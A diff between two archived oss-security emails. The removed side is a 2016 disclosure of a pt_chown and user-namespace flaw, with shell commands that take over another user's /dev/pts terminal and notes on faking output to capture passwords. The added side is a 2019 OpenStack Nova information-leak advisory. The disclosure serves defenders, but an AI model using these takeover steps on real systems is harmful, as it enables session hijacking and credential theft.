@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5010" "Tuesday" "23" "February" "2016" "12:03:54" "+0000" "halfdog" "me@halfdog.net" "<8fc639ad-daef-1a6f-facf-140eb61aeee5@halfdog.net>" "144" "[oss-security] Access to /dev/pts devices via pt_chown and user namespaces" "^Date:" nil nil "2" "2016022312:03:54" "[oss-security] Access to /dev/pts devices via pt_chown and user namespaces" (number mark "U       me@halfdog.n Feb 23  144/5010  " thread-indent "\"[oss-security] Access to /dev/pts devices via pt_chown and user namespaces\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2915" "Tuesday" "6" "August" "2019" "19:44:00" "+0000" "Jeremy Stanley" "fungi@yuggoth.org" "<20190806194400.unuo632rnugzzgq7@yuggoth.org>" "86" "[oss-security] [OSSA-2019-003] Nova Server Resource Faults Leak External Exception Details (CVE-2019-14433)" nil nil nil "8" "2019080619:44:00" "[oss-security] [OSSA-2019-003] Nova Server Resource Faults Leak External Exception Details (CVE-2019-14433)" (number mark "U       fungi@yuggot Aug  6   86/2915  " thread-indent "\"[oss-security] [OSSA-2019-003] Nova Server Resource Faults Leak External Exception Details (CVE-2019-14433)\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [OSSA-2019-003] Nova Server Resource Faults Leak External Exception Details (CVE-2019-14433)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 11507 invoked by uid 550); 23 Feb 2016 12:09:58 -0000
+Received: (qmail 3110 invoked by uid 550); 6 Aug 2019 19:44:14 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,159 +11,107 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 11299 invoked from network); 23 Feb 2016 12:09:18 -0000
-Message-ID: <8fc639ad-daef-1a6f-facf-140eb61aeee5@halfdog.net>
-User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
-MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-Date: Tue, 23 Feb 2016 12:03:54 +0000
-From: halfdog <me@halfdog.net>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Access to /dev/pts devices via pt_chown and user namespaces
+Received: (qmail 3078 invoked from network); 6 Aug 2019 19:44:13 -0000
+Date: Tue, 6 Aug 2019 19:44:00 +0000
+From: Jeremy Stanley <fungi@yuggoth.org>
 To: oss-security@lists.openwall.com
+Message-ID: <20190806194400.unuo632rnugzzgq7@yuggoth.org>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha512;
+	protocol="application/pgp-signature"; boundary="tveerclupyxofhot"
+Content-Disposition: inline
+User-Agent: NeoMutt/20170113 (1.7.2)
+X-SA-Exim-Connect-IP: 2001:4802:7801:102:be76:4eff:fe20:63e0
+X-SA-Exim-Rcpt-To: oss-security@lists.openwall.com
+X-SA-Exim-Mail-From: fungi@yuggoth.org
+X-SA-Exim-Scanned: No (on azathoth.yuggoth.org); SAEximRunCond expanded to false
+Subject: [oss-security] [OSSA-2019-003] Nova Server Resource Faults Leak External Exception
+ Details (CVE-2019-14433)
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+--tveerclupyxofhot
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
 
-Sending content from [0] also to oss-security as requested last time:
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+OSSA-2019-003: Nova Server Resource Faults Leak External Exception Details
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+:Date: August 06, 2019
+:CVE: CVE-2019-14433
 
 
-Problem description:
-====================
+Affects
+~~~~~~~
+- Nova: <17.0.12,>=3D18.0.0<18.2.2,>=3D19.0.0<19.0.2
 
-With Ubuntu Wily and earlier, /usr/lib/pt_chown was used to change
-ownership of slave pts devices in /dev/pts to the same uid holding the
-master file descriptor for the slave. This is done using the pt_chown
-SUID binary, which invokes the ptsname function on the master-fd, thus
-again performing a TIOCGPTN ioctl to get the slave pts number. Using
-the result from the ioctl, the pathname of the slave pts is
-constructed and chown invoked on it, see login/programs/pt_chown.c:
 
-  pty = ptsname (PTY_FILENO);
-  if (pty == NULL)
-    ...
-  /* Get the group ID of the special `tty' group.  */
-  p = getgrnam (TTY_GROUP);
-  gid = p ? p->gr_gid : getgid ();
+Description
+~~~~~~~~~~~
+Donny Davis with Intel reported a vulnerability in Nova Compute
+resource fault handling. If an API request from an authenticated user
+ends in a fault condition due to an external exception, details of the
+underlying environment may be leaked in the response and could include
+sensitive configuration or other data.
 
-  /* Set the owner to the real user ID, and the group to that special
-     group ID.  */
-  if (chown (pty, getuid (), gid) < 0)
-    return FAIL_EACCES;
 
-  /* Set the permission mode to readable and writable by the owner,
-     and writable by the group.  */
-  if ((st.st_mode & ACCESSPERMS) != (S_IRUSR|S_IWUSR|S_IWGRP)
-      && chmod (pty, S_IRUSR|S_IWUSR|S_IWGRP) < 0)
-    return FAIL_EACCES;
+Patches
+~~~~~~~
+- https://review.openstack.org/674908 (Ocata)
+- https://review.openstack.org/674877 (Pike)
+- https://review.openstack.org/674859 (Queens)
+- https://review.openstack.org/674848 (Rocky)
+- https://review.openstack.org/674828 (Stein)
+- https://review.openstack.org/674821 (Train)
 
-  return 0;
 
-The logic above is severely flawed, when there can be more than one
-master/slave pair having the same number and thus same name. But this
-condition can be easily created by creating an user namespace,
-mounting devpts with the newinstance option, create master and slave
-pts pairs until the number overlaps with a target pts outside the
-namespace on the host, where there is interest to gain ownership and
-then invoke pt_chown.
+Credits
+~~~~~~~
+- Donny Davis from Intel (CVE-2019-14433)
 
-Methods:
-========
 
-Exploitation is trivial: At first use any user namespace demo to
-create the namespace needed, e.g. UserNamespaceExec.c and work with
-standard shell commands, e.g. to take over /dev/pts/0:
+References
+~~~~~~~~~~
+- https://launchpad.net/bugs/1837877
+- http://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2019-14433
 
-test# who am I
-test    pts/1        2015-12-27 12:00
-test# ./UserNamespacesExec -- /bin/bash
-Setting uid map in /proc/5783/uid_map
-Setting gid map in /proc/5783/gid_map
-euid: 0, egid: 0
-euid: 0, egid: 0
-root# mkdir mnt
-root# mount -t devpts -o newinstance /dev/pts mnt
-root# cd mnt
-root# chmod 0666 ptmx
 
-Use a second shell to continue:
+Notes
+~~~~~
+- The stable/ocata and stable/pike branches are under extended maintenance =
+and
+  will receive no new point releases, but patches for them are provided as a
+  courtesy.
 
-test# cd /proc/5783/cwd
-test# ls -al
-total 4
-drwxr-xr-x 2 root  root     0 Dec 27 12:48 .
-drwxr-xr-x 7 test users 4096 Dec 27 11:57 ..
-c--------- 1 test users 5, 2 Dec 27 12:48 ptmx
-test# exec 3<>ptmx
-test# ls -al
-total 4
-drwxr-xr-x 2 root  root       0 Dec 27 12:48 .
-drwxr-xr-x 7 test users   4096 Dec 27 11:57 ..
-crw------- 1 test users 136, 0 Dec 27 12:53 0
-crw-rw-rw- 1 test users   5, 2 Dec 27 12:48 ptmx
-test# ls -al /dev/pts/0
-crw--w---- 1 root tty 136, 1 Dec 27  2015 /dev/pts/0
-test# /usr/lib/pt_chown
-test# ls -al /dev/pts/0
-crw--w---- 1 test tty 136, 1 Dec 27 12:50 /dev/pts/0
+--=20
+Jeremy Stanley
+OpenStack Vulnerability Management Team
 
-On systems where the TIOCSTI-ioctl is not prohibited, the tools from
-TtyPushbackPrivilegeEscalation to directly inject code into a shell
-using the pts device. This is not the case at least on Ubuntu Wily.
-But as reading and writing to the pts is allowed, the malicious user
-can not intercept all keystrokes and display faked output from
-commands never really executed. Thus he could lure the user into a)
-change his password or attempt to invoke su/sudo or b) simulate a
-situation, where user's next step is predictable and risky and then
-stop reading the pts, thus making user to execute a command in
-completely unexpected way.
+--tveerclupyxofhot
+Content-Type: application/pgp-signature; name="signature.asc"
 
-Results, Discussion:
-====================
-
-As already mentioned in [1], exposure of essential OS functionality,
-previously just invoked by really privileged processes, to now
-unprivileged users via user namespaces greatly increases the attack
-surface and thus is a very interesting target for exploit development.
-
-In my opinion, this security bug should be fixed two-fold: At first,
-kernel should prevent the TIOCGPTN ioctl when invoked called by a
-process within one namespace but acting on a filedescriptor from a
-devpts instance mounted in a different namespace. Additionally
-pt_chown should check via readlink and stat, that the passed file
-descriptor really was from the /dev/ptmx or /dev/pts/ptmx device
-present in the same namespace as the /dev/pts/[num] device is
-residing. This of course is only relevant if pt_chown is going to
-survive on recent namespace aware systems.
-
-Timeline:
-=========
-
-    20151220: Discovery
-    20151227: Report at Ubuntu Launchpad1529486
-    20160104: Report to distros list
-    20160122: Patch to disable unprivileged userns due to this and
-other issues LKML
-    20160222: CRD and publication
-
-References:
-===========
-
-[0]
-http://www.halfdog.net/Security/2015/PtChownArbitraryPtsAccessViaUserNamespace/
-[1]
-http://www.halfdog.net/Security/2016/OverlayfsOverFusePrivilegeEscalation/
-
-hd
-
-- -- 
-http://www.halfdog.net/
-PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
 -----BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
 
-iEYEARECAAYFAlbMSpgACgkQxFmThv7tq+53VgCdEHpGBl00dQi23z1jEz+wG+dk
-lK4AniINDh7dx9Oe6NXn5KiaFBGstw5O
-=scxD
+iQKTBAABCgB9FiEEl65Jb8At7J/DU7LnSPmWEUNJWCkFAl1J2HlfFIAAAAAALgAo
+aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldDk3
+QUU0OTZGQzAyREVDOUZDMzUzQjJFNzQ4Rjk5NjExNDM0OTU4MjkACgkQSPmWEUNJ
+WCndDRAAtq4u6Ls/edJCuG2pfB5qUe2rKn0QuIZ0F8fRZWJ0NCeqcseQtA7hThfF
+1rDAXGxnhqPSjSaesycpwOaImdTJTcNqyywxSnDEG3X7VatF43GgQhwpnRMLZrlf
+X+y45EtHNJuDAx8HIHDx/Qc/v5D3rq2GZ+zed0YK84ADpBmnRNs8bvM4vHMNzzSe
+yvSxifSD4VKJ2UVPqrPcAYp/J4n53q3bxdvGQOrLcrK6YlS+mnjvgqh6qtpCxxCK
+bSkbORAyTjFD+i8i5sErBSlkxozTrDE76GYxaWMFBUO6diWJy470I0StrVlJbWuY
+HVnkWj3thnsQQFln6BxaiL1INSDKRdGBKdF+TT6d+c32epTE7d+m0JweAvl2wwmA
+toB5AQ9ikop6SsUjzXAVrf0bzvWBtJf/nKkJT89hlUPbKTC77yGGJ3nuYW/36BDF
+dAiCH5pbAuGxf0ef5DexsPN7H+pvppc9x5ndLQQytMOCX6eXthbbbCnXClfAQ3Hz
+40dZGyJTkihwP1tPmq7AA9BXonwpUuygl+95ktD2mr5caqIuPnnLIEzjgQnWnb6v
+SPUElYaWUryRNJpg9MEYUG1kfP6TVtWqr8b8iyyfPbhQCAjB/T9uzwp9JXwEA/es
+3xTwznqJNzIJvaxOmtpdqBl4Kzog0LlWN3mjXtLpB+ox3mzkQYo=
+=cYmH
 -----END PGP SIGNATURE-----
+
+--tveerclupyxofhot--
